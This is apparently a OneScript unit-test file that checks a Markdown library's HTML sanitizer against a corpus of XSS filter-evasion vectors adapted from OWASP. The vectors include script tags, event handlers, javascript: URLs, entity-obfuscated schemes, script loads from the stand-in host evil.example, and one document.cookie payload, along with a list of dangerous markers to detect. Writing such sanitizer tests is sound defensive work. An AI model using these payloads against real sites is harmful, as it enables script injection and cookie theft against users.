#Использовать "../../src"
#Использовать asserts

// XSS-корпус: представительный набор векторов по мотивам
// OWASP XSS Filter Evasion Cheat Sheet.
// Каждый вектор после санитизации не должен содержать ни одного опасного маркера.

&Тест
Процедура ВекторыСоScriptТегами() Экспорт

    Векторы = Новый Массив;
    Векторы.Добавить("<SCRIPT>alert('XSS')</SCRIPT>");
    Векторы.Добавить("<script src=http://evil.example/xss.js></script>");
    Векторы.Добавить("<SCRIPT SRC=http://evil.example/xss.js></SCRIPT>");
    Векторы.Добавить("<SCRIPT/XSS SRC=""http://evil.example/xss.js""></SCRIPT>");
    Векторы.Добавить("<SCRIPT/SRC=""http://evil.example/xss.js""></SCRIPT>");
    Векторы.Добавить("<<SCRIPT>alert(""XSS"");//<</SCRIPT>");
    Векторы.Добавить("<SCRIPT SRC=http://evil.example/xss.js?<B>");
    Векторы.Добавить("<SCRIPT>alert(1)</SCRIPT");
    Векторы.Добавить("<script>alert(1)"); // незакрытый script — всё до конца удаляется

    ПроверитьВекторы(Векторы);

КонецПроцедуры

&Тест
Процедура ВекторыСОбработчикамиСобытий() Экспорт

    Векторы = Новый Массив;
    Векторы.Добавить("<IMG SRC=# onmouseover=""alert('xxs')"">");
    Векторы.Добавить("<IMG SRC=/ onerror=""alert('XSS')""></img>");
    Векторы.Добавить("<img src=x onerror=alert(1)//");
    Векторы.Добавить("<BODY ONLOAD=alert('XSS')>");
    Векторы.Добавить("<svg/onload=alert(1)>");
    Векторы.Добавить("<svg onload=alert(1)//");
    Векторы.Добавить("<details open ontoggle=alert(1)>x</details>");
    Векторы.Добавить("<a href=""#"" onclick=""alert(1)"">клик</a>");
    Векторы.Добавить("<INPUT TYPE=""IMAGE"" SRC=""javascript:alert('XSS');"">");
    Векторы.Добавить("<BR SIZE=""&{alert('XSS')}"">");
    Векторы.Добавить("<marquee onstart=alert(1)>x</marquee>");
    Векторы.Добавить("<video><source onerror=""alert(1)"">");

    ПроверитьВекторы(Векторы);

КонецПроцедуры

&Тест
Процедура ВекторыСОпаснымиURL() Экспорт

    Векторы = Новый Массив;
    Векторы.Добавить("<IMG SRC=""javascript:alert('XSS');"">");
    Векторы.Добавить("<IMG SRC=javascript:alert('XSS')>");
    Векторы.Добавить("<IMG SRC=JaVaScRiPt:alert('XSS')>");
    Векторы.Добавить("<IMG SRC=javascript:alert(&quot;XSS&quot;)>");
    Векторы.Добавить("<IMG SRC=`javascript:alert(""RSnake says, 'XSS'"")`>");
    Векторы.Добавить("<a href=""vbscript:msgbox('XSS')"">x</a>");
    Векторы.Добавить("<IMG SRC=""livescript:[code]"">");
    Векторы.Добавить("<a href=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="">x</a>");
    Векторы.Добавить("<TABLE BACKGROUND=""javascript:alert(1)""><tr><td>x</td></tr></table>");
    Векторы.Добавить("<IMG LOWSRC=""javascript:alert(1)"">");
    Векторы.Добавить("<IMG DYNSRC=""javascript:alert(1)"">");
    Векторы.Добавить("<a href=""  javascript:alert(1)"">x</a>");

    ПроверитьВекторы(Векторы);

КонецПроцедуры

&Тест
Процедура ВекторыСОбфускациейURL() Экспорт

    Векторы = Новый Массив;
    // десятичные сущности
    Векторы.Добавить("<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert('XSS')>");
    // десятичные с ведущими нулями и без точек с запятой
    Векторы.Добавить("<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114"
        + "&#0000105&#0000112&#0000116&#0000058alert('XSS')>");
    // шестнадцатеричные сущности
    Векторы.Добавить("<IMG SRC=&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert('XSS')>");
    // табуляция внутри схемы
    Векторы.Добавить("<IMG SRC=""jav" + Символы.Таб + "ascript:alert('XSS');"">");
    // закодированные управляющие внутри схемы
    Векторы.Добавить("<IMG SRC=""jav&#x09;ascript:alert('XSS');"">");
    Векторы.Добавить("<IMG SRC=""jav&#x0A;ascript:alert('XSS');"">");
    Векторы.Добавить("<IMG SRC=""jav&#x0D;ascript:alert('XSS');"">");
    // управляющий символ перед схемой
    Векторы.Добавить("<IMG SRC="" &#14;  javascript:alert('XSS');"">");
    // именованные сущности colon и Tab
    Векторы.Добавить("<a href=""javascript&colon;alert(1)"">x</a>");
    Векторы.Добавить("<a href=""jav&Tab;ascript:alert(1)"">x</a>");
    Векторы.Добавить("<a href=""jav&NewLine;ascript:alert(1)"">x</a>");
    // перевод строки в схеме
    Векторы.Добавить("<a href=""jav" + Символы.ПС + "ascript:alert(1)"">x</a>");

    ПроверитьВекторы(Векторы);

КонецПроцедуры

&Тест
Процедура ВекторыСОпаснымиКонтейнерами() Экспорт

    Векторы = Новый Массив;
    Векторы.Добавить("<IFRAME SRC=""javascript:alert('XSS');""></IFRAME>");
    Векторы.Добавить("<IFRAME SRC=# onmouseover=""alert(document.cookie)""></IFRAME>");
    Векторы.Добавить("<EMBED SRC=""http://evil.example/xss.swf"" AllowScriptAccess=""always""></EMBED>");
    Векторы.Добавить("<OBJECT TYPE=""text/x-scriptlet"" DATA=""http://evil.example/x.html""></OBJECT>");
    Векторы.Добавить("<STYLE>li {list-style-image: url(""javascript:alert('XSS')"");}</STYLE><UL><LI>XSS</LI></UL>");
    Векторы.Добавить("<STYLE>@import'http://evil.example/xss.css';</STYLE>");
    Векторы.Добавить("<svg><script>alert(1)</script></svg>");
    Векторы.Добавить("<math><mtext><script>alert(1)</script></mtext></math>");
    Векторы.Добавить("<FORM><BUTTON formaction=""javascript:alert(1)"">X</BUTTON></FORM>");
    Векторы.Добавить("<template><script>alert(1)</script></template>");
    Векторы.Добавить("<noscript><p title=""</noscript><img src=x onerror=alert(1)>""></noscript>");
    Векторы.Добавить("<textarea></textarea><script>alert(1)</script><textarea>");

    ПроверитьВекторы(Векторы);

КонецПроцедуры

&Тест
Процедура ВекторыСоСтилямиИМетаданными() Экспорт

    Векторы = Новый Массив;
    Векторы.Добавить("<DIV STYLE=""background-image: url(javascript:alert('XSS'))"">x</DIV>");
    Векторы.Добавить("<DIV STYLE=""width: expression(alert('XSS'));"">x</DIV>");
    Векторы.Добавить("<p style=""behavior: url(xss.htc)"">x</p>");
    Векторы.Добавить("<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascript:alert('XSS');"">");
    Векторы.Добавить("<LINK REL=""stylesheet"" HREF=""javascript:alert('XSS');"">");
    Векторы.Добавить("<BASE HREF=""javascript:alert('XSS');//"">");
    Векторы.Добавить("<XSS STYLE=""xss:expression(alert('XSS'))"">x</XSS>");

    ПроверитьВекторы(Векторы);

КонецПроцедуры

&Тест
Процедура ВекторыСКомментариямиИРазорваннымиТегами() Экспорт

    Векторы = Новый Массив;
    Векторы.Добавить("<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->");
    Векторы.Добавить("<![CDATA[<script>alert(1)</script>]]>");
    Векторы.Добавить("<!--<script>alert(1)</script>-->");
    Векторы.Добавить("<IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>"">");
    Векторы.Добавить("<scr<script>ipt>alert(1)</scr</script>ipt>");
    Векторы.Добавить("<scri<!-- -->pt>alert(1)</scri<!-- -->pt>");
    Векторы.Добавить("""><script>alert(1)</script>");

    ПроверитьВекторы(Векторы);

КонецПроцедуры

&Тест
Процедура ВекторыСНулевымиБайтами() Экспорт

    Векторы = Новый Массив;
    Векторы.Добавить("<scr" + Символ(0) + "ipt>alert(1)</script>");
    Векторы.Добавить("<img src=""java" + Символ(0) + "script:alert(1)"">");
    Векторы.Добавить("<a href=""javasc" + Символ(0) + "ript:alert(1)"">x</a>");

    ПроверитьВекторы(Векторы);

КонецПроцедуры

#Область Служебные

Процедура ПроверитьВекторы(Знач Векторы)

    Маркеры = СтрРазделить(
        "<script|javascript:|vbscript:|livescript:|data:|&{"
        + "|onerror|onload|onclick|onmouseover|onstart|ontoggle|onfocus|formaction|srcdoc|expression("
        + "|<iframe|<object|<embed|<form|<svg|<math|<style|<meta|<base|<link|<input|<body|<video|<marquee|<textarea",
        "|", Ложь);

    Для Каждого Вектор Из Векторы Цикл
        Результат = НРег(Markdown.ОчиститьHTML(Вектор));
        Для Каждого Маркер Из Маркеры Цикл
            Ожидаем.Что(Результат, "вектор: " + Вектор).Не_().Содержит(Маркер);
        КонецЦикла;
    КонецЦикла;

КонецПроцедуры

#КонецОбласти
